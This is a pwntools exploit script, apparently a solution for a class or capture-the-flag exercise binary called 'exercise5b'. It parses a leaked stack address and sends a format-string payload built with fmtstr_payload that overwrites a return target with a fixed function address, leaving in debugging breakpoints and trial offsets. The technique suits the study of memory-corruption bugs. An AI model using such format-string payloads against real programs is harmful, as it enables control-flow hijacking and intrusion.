#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise5b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x401380
b *0x4013ce
b *0x4012a9
b *0x4012ba
b *0x401358
b *0x401247
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
#pause()
# 4*11 + 1 longs = 45*4bytes = 180bytes offset
#addr = 0x004011f6
#addr = 0x7fffffffdd80
#addr = 0x7fffffffde30
l = r.recvuntil(b"\n")
addr_str = l[-13:-1]
addr = int(addr_str, 16) + 4
#180
#print(int(sys.argv[1]))
payload = fmtstr_payload(10, {addr: 0x00401247})
print(payload)
print(len(payload))

r.recvuntil(b"to run:\n")
r.sendline(payload)
print(r.recvall().decode(errors='ignore'))

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

